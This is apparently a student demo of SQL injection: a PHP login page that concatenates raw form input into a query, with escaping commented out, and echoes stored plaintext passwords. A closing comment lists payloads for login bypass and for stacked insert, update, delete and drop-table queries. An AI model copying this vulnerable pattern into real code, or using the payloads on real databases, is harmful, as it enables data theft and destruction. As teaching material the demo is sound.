<!doctype html>
<html lang="en">
<head>
<meta charset="utf-8">
<title>SQL Injection form error example</title>
 <meta name="description" content="Twitter Bootstrap Version2.0 form error example from w3resource.com."> <link href="http://localhost/twitter-bootstrap/twitter-bootstrap-v2/docs/assets/css/bootstrap.css" rel="stylesheet">
 </head>
 <body style="margin-top: 50px">
 <div class="container">
 <div class="row">
 <div class="span6">
 <?php
session_start();
//header('location:action.php');
$con = new mysqli('localhost','root');
if($con){
    echo "Connection successful";
}else{
    echo "No conn";
}
mysqli_select_db($con, 'nisproject');
$name = $_POST['name'];
$password = $_POST['password'];
// $name = mysqli_real_escape_string($con,$_POST['name']);
// $password = mysqli_real_escape_string($con,$_POST['password']);
$stmt = "select * from logininfo where name = '$name' and password='$password' ";
$result = mysqli_query($con, $stmt);   // mysqli_multi_query for update, delete,insert
if(mysqli_num_rows($result) > 0)
{echo "<h4>".
"-- Personal Information -- ".

"</br>";
while ($row=mysqli_fetch_row($result)){
echo "<p>".
"User Id : ".
$row[0]."</p>";
echo "<p>".
"Username : ".
$row[1]."</p>";
echo "<p>".
"Password : ".
$row[2]."</p>";
echo "--------------------------------------------";}}else  
 echo nl2br("Invalid user id or password");
?>
</div>
</div>
</div>
</body>
</html>


<!--

NORMAL INJECTION:
        username: abcde
        password: anything' OR '1' = '1

INSERT: username: random
        password: '; insert into logininfo values(12,'tommy','tommy') ; --

UPDATE: username: random
        password: '; update logininfo set name="edward" where id="11"; --

DELETE: username: random
        password: '; delete from logininfo where id="10"; --

DROP:   username: random
  password: '; drop table nis; --



 -->
